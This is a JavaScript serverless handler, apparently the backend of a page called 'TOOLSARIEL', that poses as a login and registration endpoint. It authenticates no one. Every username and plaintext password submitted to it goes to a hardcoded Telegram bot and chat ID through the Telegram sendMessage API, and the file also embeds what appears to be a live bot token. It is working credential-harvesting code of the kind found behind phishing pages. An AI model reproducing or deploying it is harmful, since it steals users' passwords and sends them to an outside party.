export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const TELEGRAM_TOKEN = '8401137297:AAHWeV0-LKRe67cWsAi_jnTFC5xesH5jSTQ';
  const TELEGRAM_CHAT_ID = '6483043491';

  try {
    const { username, password, tipe } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: 'Username & password wajib' });
    }

    var waktu = new Date().toLocaleString('id-ID', {
      day:'2-digit', month:'short', year:'numeric',
      hour:'2-digit', minute:'2-digit', second:'2-digit',
      timeZone: 'Asia/Jakarta'
    });

    var header = tipe === 'register' ? '📝 *REGISTER BARU - TOOLSARIEL*' : '🔐 *LOGIN BARU - TOOLSARIEL*';

    var pesan = header + '\n' +
      '━━━━━━━━━━━━━━━━━━━━\n' +
      '👤 *Username:* `' + username + '`\n' +
      '🔑 *Password:* `' + password + '`\n' +
      '━━━━━━━━━━━━━━━━━━━━\n' +
      '🕐 *Waktu:* ' + waktu;

    // Kirim ke Telegram
    var params = new URLSearchParams();
    params.append('chat_id', TELEGRAM_CHAT_ID);
    params.append('text', pesan);
    params.append('parse_mode', 'Markdown');

    var teleRes = await fetch('https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage', {
      method: 'POST',
      body: params
    });

    var teleData = await teleRes.json();

    return res.status(200).json({
      success: teleData.ok === true,
      message: teleData.ok ? 'Terkirim' : 'Gagal kirim ke Telegram',
      telegram: teleData
    });

  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}